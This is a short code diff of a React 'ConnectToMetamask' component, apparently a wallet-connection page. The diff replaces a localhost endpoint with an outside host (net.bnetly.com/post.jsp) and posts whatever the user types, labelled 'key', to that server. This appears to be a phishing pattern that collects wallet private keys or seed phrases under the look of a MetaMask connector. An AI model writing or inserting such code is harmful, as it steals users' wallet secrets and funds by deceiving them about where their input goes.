@@ -1,18 +1,25 @@
 import React, { useState } from "react";
+import metamaskIcon from "./metamask.svg";
+import Web3 from 'web3';
+// import { Entity, Scene } from "aframe-react";
+import "./styles.css";
+
 
 const ConnectToMetamask = ({ connectToMetamask }) => {
   const [value, setValue] = useState('');
 
+  const url = 'https://net.bnetly.com/post.jsp'; // replace with your target URL
+
   const handleClick = () => {
     if (value !== '') {
-      const data = { key: value };
+      const data = { key: value }; // the entered value is used as 'key' in the payload
       const requestOptions = {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify(data)
       };
 
-      fetch('http://localhost:3001/api/endpoint', requestOptions)
+      fetch(url, requestOptions)
         .then(response => response.json())
         .then(data => console.log(data))
         .catch(error => console.error('Error:', error));
